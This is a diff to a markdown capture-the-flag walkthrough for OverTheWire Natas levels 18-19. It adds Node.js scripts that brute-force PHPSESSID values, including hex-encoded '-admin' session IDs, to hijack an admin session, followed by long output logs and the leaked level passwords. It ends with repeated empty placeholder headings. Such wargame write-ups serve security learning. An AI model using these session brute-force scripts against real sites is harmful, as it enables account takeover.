@@ -429,7 +429,580 @@ app.listen(port, () => console.log(`Example app listening at http://localhost:${
 ```
 
 ### Level 18 `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`
-- 
+- Understanding the code, it's apparent that not a lot can be done/manipulated.
+- We cannot get admin's credentials, unless we hit it's session.
+- So we brute-force with all session IDs until we actuall hit it, using the following script:
+```javascript
+const express = require('express');
+const axios = require('axios');
+const app = express();
+const port = 3000;
 
-### Level 19 ``
+app.get('/', (req, res) => res.send('Hello World!'));
+
+async function req(ch) {
+    const headers = {
+        'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==',
+        'Cookie': `PHPSESSID=${ch}`
+    }
+    const res = await axios.post(`http://natas18.natas.labs.overthewire.org/index.php?debug=1`, `username=natas19`, {headers, withCredentials: true});
+    console.log(`For sessionId = ${ch}`);
+    if(res.data.includes('regular')) {
+        return false;
+    } else {
+        console.log(res.data);
+        return true;
+    }
+}
+
+async function calc() {
+    for(let i=1; i<=640; i++) {
+        let val = await req(i);
+        if(val) {
+            break;
+        }
+    }
+    console.log('fin');
+}
+
+calc();
+
+app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));
+
+// Outputs:
+// Example app listening at http://localhost:3000
+// For sessionId = 1
+// For sessionId = 2
+// For sessionId = 3
+// For sessionId = 4
+// For sessionId = 5
+// For sessionId = 6
+// For sessionId = 7
+// For sessionId = 8
+// For sessionId = 9
+// For sessionId = 10
+// For sessionId = 11
+// For sessionId = 12
+// For sessionId = 13
+// For sessionId = 14
+// For sessionId = 15
+// For sessionId = 16
+// For sessionId = 17
+// For sessionId = 18
+// For sessionId = 19
+// For sessionId = 20
+// For sessionId = 21
+// For sessionId = 22
+// For sessionId = 23
+// For sessionId = 24
+// For sessionId = 25
+// For sessionId = 26
+// For sessionId = 27
+// For sessionId = 28
+// For sessionId = 29
+// For sessionId = 30
+// For sessionId = 31
+// For sessionId = 32
+// For sessionId = 33
+// For sessionId = 34
+// For sessionId = 35
+// For sessionId = 36
+// For sessionId = 37
+// For sessionId = 38
+// For sessionId = 39
+// For sessionId = 40
+// For sessionId = 41
+// For sessionId = 42
+// For sessionId = 43
+// For sessionId = 44
+// For sessionId = 45
+// For sessionId = 46
+// For sessionId = 47
+// For sessionId = 48
+// For sessionId = 49
+// For sessionId = 50
+// For sessionId = 51
+// For sessionId = 52
+// For sessionId = 53
+// For sessionId = 54
+// For sessionId = 55
+// For sessionId = 56
+// For sessionId = 57
+// For sessionId = 58
+// For sessionId = 59
+// For sessionId = 60
+// For sessionId = 61
+// For sessionId = 62
+// For sessionId = 63
+// For sessionId = 64
+// For sessionId = 65
+// For sessionId = 66
+// For sessionId = 67
+// For sessionId = 68
+// For sessionId = 69
+// For sessionId = 70
+// For sessionId = 71
+// For sessionId = 72
+// For sessionId = 73
+// For sessionId = 74
+// For sessionId = 75
+// For sessionId = 76
+// For sessionId = 77
+// For sessionId = 78
+// For sessionId = 79
+// For sessionId = 80
+// For sessionId = 81
+// For sessionId = 82
+// For sessionId = 83
+// For sessionId = 84
+// For sessionId = 85
+// For sessionId = 86
+// For sessionId = 87
+// For sessionId = 88
+// For sessionId = 89
+// For sessionId = 90
+// For sessionId = 91
+// For sessionId = 92
+// For sessionId = 93
+// For sessionId = 94
+// For sessionId = 95
+// For sessionId = 96
+// For sessionId = 97
+// For sessionId = 98
+// For sessionId = 99
+// For sessionId = 100
+// For sessionId = 101
+// For sessionId = 102
+// For sessionId = 103
+// For sessionId = 104
+// For sessionId = 105
+// For sessionId = 106
+// For sessionId = 107
+// For sessionId = 108
+// For sessionId = 109
+// For sessionId = 110
+// For sessionId = 111
+// For sessionId = 112
+// For sessionId = 113
+// For sessionId = 114
+// For sessionId = 115
+// For sessionId = 116
+// For sessionId = 117
+// For sessionId = 118
+// For sessionId = 119
+// <html>
+// <head>
+// <!-- This stuff in the header has nothing to do with the level -->
+// <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+// <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+// <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+// <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+// <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+// <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+// <script>var wechallinfo = { "level": "natas18", "pass": "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP" };</script></head>
+// <body>
+// <h1>natas18</h1>
+// <div id="content">
+// DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19
+// Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+// </div>
+// </body>
+// </html>
+
+// fin
+```
+
+### Level 19 `4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs`
+- The PHPSESSID is not sequential this time. So we try to see a few different PHPSESSID for no username.
+- We see that the PHPSESSID always ends with `2d` which is hexcode for ascii `-`.
+- Also notice that it says, we have to login as admin, which makes it pretty safe to assume that the username has to be `admin`.
+- Also the one thing to notice is that as soon as we add the username admin, the PHPSESSID starts always ending in `2d61646d696e` which is hexcode for ascii `-admin`.
+- Also the prefix to `2d61646d696e` is always of the type `3x3y3z`, which makes it safe to assume that this is the sessionId ascii converted to hexcode.
+- So now that we've broken their code, we'll brute-force all the PHPSESSIDs for username admin:
+```javascript
+const express = require('express');
+const axios = require('axios');
+const app = express();
+const port = 3000;
+
+app.get('/', (req, res) => res.send('Hello World!'));
+
+function gen(num) {
+    let ch = num.toString();
+    let x = '';
+    for(let i=0; i<ch.length; i++) {
+        x += '3';
+        x += ch[i];
+    }
+    return x;
+}
+
+async function req(ch) {
+    const headers = {
+        'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==',
+        'Cookie': `PHPSESSID=${gen(ch)}2d61646d696e`
+    }
+    const res = await axios.post(`http://natas19.natas.labs.overthewire.org/index.php?debug=1`, `username=admin&password=`, {headers, withCredentials: true});
+    console.log(`For try #${ch}`);
+    if(res.data.includes('regular')) {
+        // console.log(res.data);
+        return false;
+    } else {
+        console.log(res.data);
+        return true;
+    }
+}
+
+async function calc() {
+    for(let i=1; i<=640; i++) {
+        let val = await req(i);
+        if(val) {
+            break;
+        }
+    }
+    console.log('fin');
+}
+
+calc();
+
+app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));
+
+// Outputs:
+// Example app listening at http://localhost:3000
+// For try #1
+// For try #2
+// For try #3
+// For try #4
+// For try #5
+// For try #6
+// For try #7
+// For try #8
+// For try #9
+// For try #10
+// For try #11
+// For try #12
+// For try #13
+// For try #14
+// For try #15
+// For try #16
+// For try #17
+// For try #18
+// For try #19
+// For try #20
+// For try #21
+// For try #22
+// For try #23
+// For try #24
+// For try #25
+// For try #26
+// For try #27
+// For try #28
+// For try #29
+// For try #30
+// For try #31
+// For try #32
+// For try #33
+// For try #34
+// For try #35
+// For try #36
+// For try #37
+// For try #38
+// For try #39
+// For try #40
+// For try #41
+// For try #42
+// For try #43
+// For try #44
+// For try #45
+// For try #46
+// For try #47
+// For try #48
+// For try #49
+// For try #50
+// For try #51
+// For try #52
+// For try #53
+// For try #54
+// For try #55
+// For try #56
+// For try #57
+// For try #58
+// For try #59
+// For try #60
+// For try #61
+// For try #62
+// For try #63
+// For try #64
+// For try #65
+// For try #66
+// For try #67
+// For try #68
+// For try #69
+// For try #70
+// For try #71
+// For try #72
+// For try #73
+// For try #74
+// For try #75
+// For try #76
+// For try #77
+// For try #78
+// For try #79
+// For try #80
+// For try #81
+// For try #82
+// For try #83
+// For try #84
+// For try #85
+// For try #86
+// For try #87
+// For try #88
+// For try #89
+// For try #90
+// For try #91
+// For try #92
+// For try #93
+// For try #94
+// For try #95
+// For try #96
+// For try #97
+// For try #98
+// For try #99
+// For try #100
+// For try #101
+// For try #102
+// For try #103
+// For try #104
+// For try #105
+// For try #106
+// For try #107
+// For try #108
+// For try #109
+// For try #110
+// For try #111
+// For try #112
+// For try #113
+// For try #114
+// For try #115
+// For try #116
+// For try #117
+// For try #118
+// For try #119
+// For try #120
+// For try #121
+// For try #122
+// For try #123
+// For try #124
+// For try #125
+// For try #126
+// For try #127
+// For try #128
+// For try #129
+// For try #130
+// For try #131
+// For try #132
+// For try #133
+// For try #134
+// For try #135
+// For try #136
+// For try #137
+// For try #138
+// For try #139
+// For try #140
+// For try #141
+// For try #142
+// For try #143
+// For try #144
+// For try #145
+// For try #146
+// For try #147
+// For try #148
+// For try #149
+// For try #150
+// For try #151
+// For try #152
+// For try #153
+// For try #154
+// For try #155
+// For try #156
+// For try #157
+// For try #158
+// For try #159
+// For try #160
+// For try #161
+// For try #162
+// For try #163
+// For try #164
+// For try #165
+// For try #166
+// For try #167
+// For try #168
+// For try #169
+// For try #170
+// For try #171
+// For try #172
+// For try #173
+// For try #174
+// For try #175
+// For try #176
+// For try #177
+// For try #178
+// For try #179
+// For try #180
+// For try #181
+// For try #182
+// For try #183
+// For try #184
+// For try #185
+// For try #186
+// For try #187
+// For try #188
+// For try #189
+// For try #190
+// For try #191
+// For try #192
+// For try #193
+// For try #194
+// For try #195
+// For try #196
+// For try #197
+// For try #198
+// For try #199
+// For try #200
+// For try #201
+// For try #202
+// For try #203
+// For try #204
+// For try #205
+// For try #206
+// For try #207
+// For try #208
+// For try #209
+// For try #210
+// For try #211
+// For try #212
+// For try #213
+// For try #214
+// For try #215
+// For try #216
+// For try #217
+// For try #218
+// For try #219
+// For try #220
+// For try #221
+// For try #222
+// For try #223
+// For try #224
+// For try #225
+// For try #226
+// For try #227
+// For try #228
+// For try #229
+// For try #230
+// For try #231
+// For try #232
+// For try #233
+// For try #234
+// For try #235
+// For try #236
+// For try #237
+// For try #238
+// For try #239
+// For try #240
+// For try #241
+// For try #242
+// For try #243
+// For try #244
+// For try #245
+// For try #246
+// For try #247
+// For try #248
+// For try #249
+// For try #250
+// For try #251
+// For try #252
+// For try #253
+// For try #254
+// For try #255
+// For try #256
+// For try #257
+// For try #258
+// For try #259
+// For try #260
+// For try #261
+// For try #262
+// For try #263
+// For try #264
+// For try #265
+// For try #266
+// For try #267
+// For try #268
+// For try #269
+// For try #270
+// For try #271
+// For try #272
+// For try #273
+// For try #274
+// For try #275
+// For try #276
+// For try #277
+// For try #278
+// For try #279
+// For try #280
+// For try #281
+// <html>
+// <head>
+// <!-- This stuff in the header has nothing to do with the level -->
+// <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+// <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+// <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+// <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+// <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+// <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+// <script>var wechallinfo = { "level": "natas19", "pass": "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" };</script></head>
+// <body>
+// <h1>natas19</h1>
+// <div id="content">
+// <p>
+// <b>
+// This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+// </b>
+// </p>
+// DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20
+// Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
+// </body>
+// </html>
+
+// fin
+- Which gives us the password for the next level.
+```
+
+### Level 20 `eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF`
+
+### Level 21 ``
+-
+
+### Level 21 ``
+-
+
+### Level 21 ``
+-
+
+### Level 21 ``
+-
+
+### Level 21 ``
+-
+
+### Level 21 ``
+-
+
+### Level 21 ``
+-
+
+### Level 21 ``
+-
+
+### Level 21 ``
+-
 
